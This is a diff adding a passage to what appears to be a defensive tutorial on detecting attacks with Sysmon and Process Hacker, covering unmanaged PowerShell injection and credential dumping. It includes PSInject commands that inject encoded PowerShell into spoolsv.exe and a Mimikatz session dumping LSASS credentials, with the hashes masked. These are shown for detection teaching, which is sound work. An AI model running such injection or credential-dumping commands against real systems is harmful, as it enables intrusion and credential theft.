@@ -73,3 +73,66 @@ Let's explore these indicators of compromise (IOC):
 C# is considered a "managed" language, meaning it requires a backend runtime to execute its code. The [Common Language Runtime (CLR)](https://docs.microsoft.com/en-us/dotnet/standard/clr) serves as this runtime environment. [Managed code](https://docs.microsoft.com/en-us/dotnet/standard/managed-code) does not directly run as assembly; instead, it is compiled into a bytecode format that the runtime processes and executes. Consequently, a managed process relies on the CLR to execute C# code.
 
 As defenders, we can leverage this knowledge to detect unusual C# injections or executions within our environment. To accomplish this, we can utilize a useful utility called [Process Hacker](https://processhacker.sourceforge.io/).
+
+Within Process Hacker, examining the module loads for `powershell.exe`, by right-clicking on `powershell.exe`, clicking "Properties", and navigating to "Modules", we can find relevant information.
+
+The presence of "Microsoft .NET Runtime...", `clr.dll`, and `clrjit.dll` should attract our attention. These 2 DLLs are used when C# code is ran as part of the runtime to execute the bytecode. If we observe these DLLs loaded in processes that typically do not require them, it suggests a potential [execute-assembly](https://www.cobaltstrike.com/blog/cobalt-strike-3-11-the-snake-that-eats-its-tail/) or [unmanaged PowerShell injection](https://www.youtube.com/watch?v=7tvfb9poTKg&ab_channel=RaphaelMudge) attack.
+
+To showcase unmanaged PowerShell injection, we can inject an [unmanaged PowerShell-like DLL](https://github.com/leechristensen/UnmanagedPowerShell) into a random process, such as `spoolsv.exe`. We can do that by utilizing the [PSInject project](https://github.com/EmpireProject/PSInject) in the following manner.
+
+```powershell-session
+ powershell -ep bypass
+ Import-Module .\Invoke-PSInject.ps1
+ Invoke-PSInject -ProcId [Process ID of spoolsv.exe] -PoshCode "V3JpdGUtSG9zdCAiSGVsbG8sIEd1cnU5OSEi"
+```
+
+After the injection, we observe that "spoolsv.exe" transitions from an unmanaged to a managed state as it is running PowerShell
+
+# Detection Example 3: Detecting Credential Dumping
+
+One widely used tool for credential dumping is [Mimikatz](https://github.com/gentilkiwi/mimikatz), offering various methods for extracting Windows credentials. One specific command, "sekurlsa::logonpasswords", enables the dumping of password hashes or plaintext passwords by accessing the [Local Security Authority Subsystem Service (LSASS)](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service). LSASS is responsible for managing user credentials and is a primary target for credential-dumping tools like Mimikatz.
+
+```cmd-session
+C:\Tools\Mimikatz> mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 1128191 (00000000:001136ff)
+Session           : RemoteInteractive from 2
+User Name         : Administrator
+Domain            : DESKTOP-NU10MTO
+Logon Server      : DESKTOP-NU10MTO
+Logon Time        : 5/31/2023 4:14:41 PM
+SID               : S-1-5-21-2712802632-2324259492-1677155984-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : DESKTOP-NU10MTO
+         * NTLM     : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+         * SHA1     : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX0812156b
+        tspkg :
+        wdigest :
+         * Username : Administrator
+         * Domain   : DESKTOP-NU10MTO
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : DESKTOP-NU10MTO
+         * Password : (null)
+        ssp :   KO
+        credman :
+```
+
+As we can see, the output of the "sekurlsa::logonpasswords" command provides powerful insights into compromised credentials.
+
+To detect this activity, we can rely on a different Sysmon event. Instead of focusing on DLL loads, we shift our attention to process access events. By checking `Sysmon event ID 10`, which represents "ProcessAccess" events, we can identify any suspicious attempts to access LSASS.
